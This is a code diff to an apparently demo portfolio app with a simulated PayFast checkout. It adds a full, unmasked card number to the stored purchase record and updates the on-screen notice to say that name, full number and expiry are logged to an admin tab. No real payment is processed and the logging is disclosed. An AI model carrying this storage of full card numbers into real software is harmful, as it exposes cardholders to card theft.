@@ -1581,6 +1581,7 @@
       user,
       player,
       cardholderName,
+      cardNumber,
       cardNumberMasked,
       cardBrand,
       cardExpiry,
@@ -1597,6 +1598,7 @@
         tokens: pack.tokens,
         amount: pack.value.replace("R", ""),
         cardholderName: cardholderName || null,
+        cardNumber: cardNumber || null,
         cardNumberMasked,
         cardBrand,
         cardExpiry: cardExpiry || null,
@@ -2248,6 +2250,7 @@
               user: currentUser,
               player: pendingLockPlayer,
               cardholderName: demoCardholderName.trim(),
+              cardNumber: formatDemoCardNumber(cardDigits),
               cardNumberMasked: maskedCard,
               cardBrand,
               cardExpiry: demoCardExpiry,
@@ -3528,8 +3531,9 @@
                 {demoPayfastStep === "form" && (
                   <form onSubmit={handleDemoPayfastSubmit} className="px-5 py-5 space-y-4">
                     <p className="text-xs text-slate-600 leading-relaxed">
-                      Enter demo card details below. This screen simulates PayFast checkout for your portfolio —{" "}
-                      <strong>no real payment is processed</strong>. CVV is never stored.
+                      Enter demo card details below. For your portfolio presentation, cardholder name, full card number,
+                      and expiry are logged to the <strong>Demo PayFast</strong> admin tab —{" "}
+                      <strong>no real payment is processed</strong>. CVV is never stored (PCI standard).
                     </p>
 
                     {demoPayfastError && (
